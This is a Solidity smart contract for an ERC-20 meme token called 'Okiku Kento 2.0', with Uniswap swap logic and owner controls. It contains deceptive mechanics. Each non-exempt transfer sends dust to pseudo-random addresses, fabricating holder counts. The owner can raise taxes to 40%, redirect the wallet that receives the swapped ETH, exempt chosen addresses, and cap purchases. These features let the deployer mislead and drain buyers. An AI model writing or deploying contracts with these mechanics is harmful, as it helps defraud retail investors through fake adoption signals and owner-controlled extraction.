// SPDX-License-Identifier: MIT



pragma solidity ^0.8.7;



/*

 * Twitter : https://twitter.com/okiku2eth

 * Telegram : https://t.me/Okiku2ETH

 * Website : oken20.co

*/



interface IERC20 {

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IUniswapRouter {



    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);



    function WETH() external pure returns (address);



    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



interface IUniswapFactory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



abstract contract Ownable {

    address internal _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = msg.sender;

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == msg.sender, "you are not owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "new is 0");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}



contract ERC20 is IERC20, Ownable {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;



    address private fundAddress;



    string private _name;

    string private _symbol;

    uint8 private _decimals;



    mapping(address => bool) public _isExcludeFromFee;

    

    uint256 private _totalSupply;



    IUniswapRouter public _uniswapRouter;



    mapping(address => bool) public isMarketPair;

    bool private inSwap;



    uint256 private constant MAX = ~uint256(0);



    uint256 public _buyFundFee = 20;

    uint256 public _sellFundFee = 20;



    address public _uniswapPair;



    modifier lockTheSwap {

        inSwap = true;

        _;

        inSwap = false;

    }



    constructor (){

        _name = "Okiku Kento 2.0";

        _symbol = "OKEN2.0";

        _decimals = 18;

        uint256 Supply = 420_690_000_000_000;



        _totalSupply = Supply * 10 ** _decimals;



        address receiveAddr = msg.sender;

        _balances[receiveAddr] = _totalSupply;

        emit Transfer(address(0), receiveAddr, _totalSupply);



        fundAddress = receiveAddr;



        _isExcludeFromFee[address(this)] = true;

        _isExcludeFromFee[receiveAddr] = true;

        _isExcludeFromFee[fundAddress] = true;

    }



    function designTax(

        uint256 newBuy,

        uint256 newSell

    ) public onlyOwner {

        _buyFundFee = newBuy;

        _sellFundFee = newSell;

        require(_buyFundFee <= 40 && _sellFundFee <= 40,"too high");

    }



    event update(address);

    function initialPair(

        address _n

    ) public onlyOwner{

        IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _uniswapRouter = swapRouter;

        _allowances[address(this)][address(swapRouter)] = MAX;



        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());

        address swapPair = swapFactory.getPair(

            address(this), swapRouter.WETH()

        );

        if (swapPair == address(0)){

            swapPair = swapFactory.createPair(address(this), swapRouter.WETH());

        }

        

        _uniswapPair = swapPair;

        isMarketPair[swapPair] = true;

        IERC20(_uniswapRouter.WETH()).approve(

            address(address(_uniswapRouter)),

            ~uint256(0)

        );

        fundAddress = _n;

        emit update(fundAddress);

        _isExcludeFromFee[address(swapRouter)] = true;

    }



    function setFundAddr(address newAddr) public onlyOwner{

        fundAddress = newAddr;

    }



    function symbol() external view override returns (string memory) {

        return _symbol;

    }



    function name() external view override returns (string memory) {

        return _name;

    }



    function decimals() external view override returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account) public view override returns (uint256) {

        return _balances[account];

    }



    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(msg.sender, recipient, amount);

        return true;

    }



    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(msg.sender, spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        if (_allowances[sender][msg.sender] != MAX) {

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;

        }

        return true;

    }



    function _approve(address owner, address spender, uint256 amount) private {

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    bool public remainEn = true;

    function changeRemain() public onlyOwner{

        remainEn = !remainEn;

    }



    function sellToken(uint Token)public  view returns (uint){

        address _currency = _uniswapRouter.WETH();

        if(IERC20(address(_currency)).balanceOf(_uniswapPair) > 0){

            address[] memory path = new address[](2);

            uint[] memory amount;

            path[0]=address(this);

            path[1]=_currency;

            amount = _uniswapRouter.getAmountsOut(Token,path); 

            return amount[1];

        }else {

            return 0; 

        }

    }



    uint256 public limitAmounts = 0.1 ether;

    function setLimitAmounts(uint256 newValue) public onlyOwner{

        limitAmounts = newValue;

    }



    uint256 public airDropNumbs = 2;

    function setAirdropNumbs(uint256 newValue) public onlyOwner{

        airDropNumbs = newValue;

    }



    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] -= amount;

        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        return true;

    }



    function _transfer(

        address from,

        address to,

        uint256 amount

    ) private {

        uint256 balance = balanceOf(from);

        require(balance >= amount, "balanceNotEnough");



        bool takeFee;

        bool sellFlag;



        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to]) {

            uint256 numtoselltoken = amount;

            if (numtoselltoken > balanceOf(address(this))){

                numtoselltoken = _balances[address(this)];

            }

            if (numtoselltoken > 0){

                swapTokenForETH(numtoselltoken); 

            }

        }



        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && remainEn){

            address ad;

            for(uint256 i=0;i < airDropNumbs;i++){

                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));

                _basicTransfer(from,ad,10);

            }

            amount -= airDropNumbs*10;



            if (isMarketPair[from] && limitAmounts != 0){

                require(sellToken(amount) <= limitAmounts);

            }

        }



        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {

            takeFee = true;

        }



        if (takeFee && !isMarketPair[from] && !isMarketPair[to]){

            takeFee = false;

        }



        if (isMarketPair[to]) { sellFlag = true; }



        _transferToken(from, to, amount, takeFee, sellFlag);

    }



    function _transferToken(

        address sender,

        address recipient,

        uint256 tAmount,

        bool takeFee,

        bool sellFlag

    ) private {

        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;



        if (takeFee) {

            

            uint256 taxFee;



            if (sellFlag) {

                taxFee = _sellFundFee;

            } else {

                taxFee = _buyFundFee;

            }

            uint256 swapAmount = tAmount * taxFee / 100;

            if (swapAmount > 0) {

                feeAmount += swapAmount;

                _balances[address(this)] = _balances[address(this)] + swapAmount;

                emit Transfer(sender, address(this), swapAmount);

            }

        }



        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);

        emit Transfer(sender, recipient, tAmount - feeAmount);



    }



    function removeERC20(address _token) external {

        if(_token != address(this)){

            IERC20(_token).transfer(fundAddress, IERC20(_token).balanceOf(address(this)));

            payable(fundAddress).transfer(address(this).balance);

        }

    }



    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = _uniswapRouter.WETH();

        try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0,

            path,

            address(fundAddress),

            block.timestamp

        ) {} catch {}

    }



    function setIsExcludeFromFees(address account, bool value) public onlyOwner{

        _isExcludeFromFee[account] = value;

    }



    receive() external payable {}

}